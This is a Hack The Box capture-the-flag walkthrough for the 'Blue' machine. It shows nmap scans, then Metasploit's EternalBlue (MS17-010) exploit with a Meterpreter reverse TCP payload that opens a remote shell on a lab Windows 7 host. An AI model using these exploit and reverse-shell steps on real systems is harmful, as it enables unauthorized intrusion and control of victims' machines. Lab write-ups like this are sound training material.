# Blue Walkthrough

![Blue](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Blue/Blue.png)

## let's first fast scan our machine ip with nmap.

```console
$ sudo nmap -F -sV 10.10.10.40

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 18:12 IST 
Nmap scan report for 10.10.10.40 
Host is up (0.28s latency). 
Not shown: 91 closed tcp ports (reset) 
PORT      STATE SERVICE      VERSION 
135/tcp   open  msrpc        Microsoft Windows RPC 
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn 
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 
49152/tcp open  msrpc        Microsoft Windows RPC 
49153/tcp open  msrpc        Microsoft Windows RPC 
49154/tcp open  msrpc        Microsoft Windows RPC 
49155/tcp open  msrpc        Microsoft Windows RPC 
49156/tcp open  msrpc        Microsoft Windows RPC 
49157/tcp open  msrpc        Microsoft Windows RPC 
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows 
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 71.07 seconds
```

## we got two smb port 139 and 445, let's enumerate these port using nmap samba enumeration script.

```console
$sudo nmap --script smb-vuln* -p 139,445 10.10.10.40 -oN smb-enumerate.txt                                           
[sudo] password for darksoul:  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 18:17 IST 
Nmap scan report for 10.10.10.40 
Host is up (0.27s latency). 
 
PORT    STATE SERVICE 
139/tcp open  netbios-ssn 
445/tcp open  microsoft-ds 
 
Host script results: 
| smb-vuln-ms17-010:  
|   VULNERABLE: 
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) 
|     State: VULNERABLE 
|     IDs:  CVE:CVE-2017-0143 
|     Risk factor: HIGH 
|       A critical remote code execution vulnerability exists in Microsoft SMBv1 
|        servers (ms17-010). 
|            
|     Disclosure date: 2017-03-14 
|     References: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ 
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx 
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND 
|_smb-vuln-ms10-054: false
```

## we got a samba Remote Code Execution vulnerability now i load metasploit and use samba exploit.

```console
                                   ___          ____ 
                               ,-""   `.      < HONK > 
                             ,'  _   e )`-._ /  ---- 
                            /  ,' `-._<.===-' 
                           /  / 
                          /  ; 
              _          /   ; 
 (`._    _.-"" ""--..__,'    | 
 <_  `-""                     \ 
  <`-                         : 
   (__   <__.                  ; 
     `-.   '-.__.      _.'    / 
        \      `-.__,-'    _,' 
         `._    ,    /__,-' 
            ""._\__,'< <____ 
                 | |  `----.`. 
                 | |        \ `. 
                 ; |___      \-`` 
                 \   --< 
                  `.`.< 
                    `-' 
 
 
 
       =[ metasploit v6.1.34-dev                          ] 
+ -- --=[ 2209 exploits - 1171 auxiliary - 395 post       ] 
+ -- --=[ 615 payloads - 45 encoders - 11 nops            ] 
+ -- --=[ 9 evasion                                       ] 
 
Metasploit tip: View missing module options with show  
missing 
 
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

## Then i add reverse tcp payload 

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp 
payload => windows/x64/meterpreter/reverse_tcp
```

## then i set options lhost, rhosts

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.10.40 
rhosts => 10.10.10.40 
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.10 
lhost => 10.10.14.10
```

## and then run the exploit and got shell

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit 
 
[*] Started reverse TCP handler on 10.10.14.10:4444  
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check 
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-b
it) 
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete) 
[+] 10.10.10.40:445 - The target is vulnerable. 
[*] 10.10.10.40:445 - Connecting to target for exploitation. 
[+] 10.10.10.40:445 - Connection established for exploitation. 
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply 
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes) 
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes 
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv 
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1       
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply 
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations. 
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet 
[*] 10.10.10.40:445 - Starting non-paged pool grooming 
[+] 10.10.10.40:445 - Sending SMBv2 buffers 
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. 
[*] 10.10.10.40:445 - Sending final SMBv2 buffers. 
[*] 10.10.10.40:445 - Sending last fragment of exploit packet! 
[*] 10.10.10.40:445 - Receiving response from exploit packet 
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! 
[*] 10.10.10.40:445 - Sending egg to corrupted connection. 
[*] 10.10.10.40:445 - Triggering free of corrupted buffer. 
[*] Sending stage (200262 bytes) to 10.10.10.40 
[*] Meterpreter session 1 opened (10.10.14.10:4444 -> 10.10.10.40:49158 ) at 2022-04-14 18:27:18 +0530 
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
 
meterpreter > sysinfo 
Computer        : HARIS-PC 
OS              : Windows 7 (6.1 Build 7601, Service Pack 1). 
Architecture    : x64 
System Language : en_GB 
Domain          : WORKGROUP 
Logged On Users : 2 
Meterpreter     : x64/windows 
meterpreter > shell 
Process 2656 created. 
Channel 1 created. 
Microsoft Windows [Version 6.1.7601] 
Copyright (c) 2009 Microsoft Corporation.  All rights reserved. 
 
C:\Windows\system32>cd C:\Users\haris\Desktop

C:\Users\haris\Desktop>dir 
dir 
 Volume in drive C has no label. 
 Volume Serial Number is BE92-053B 
 
 Directory of C:\Users\haris\Desktop 
 
24/12/2017  03:23    <DIR>          . 
24/12/2017  03:23    <DIR>          .. 
14/04/2022  13:38                34 user.txt 
               1 File(s)             34 bytes 
               2 Dir(s)   2,429,390,848 bytes free 

C:\Users\haris\Desktop>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir 
dir 
 Volume in drive C has no label. 
 Volume Serial Number is BE92-053B 
 
 Directory of C:\Users\Administrator\Desktop 
 
24/12/2017  03:22    <DIR>          . 
24/12/2017  03:22    <DIR>          .. 
14/04/2022  13:38                34 root.txt 
               1 File(s)             34 bytes 
               2 Dir(s)   2,429,390,848 bytes free 

```

# BOOOMMM!! MACHINE GOT SOLVED 

![funny](https://c.tenor.com/tInXY9TY0oMAAAAd/meme-dance.gif)
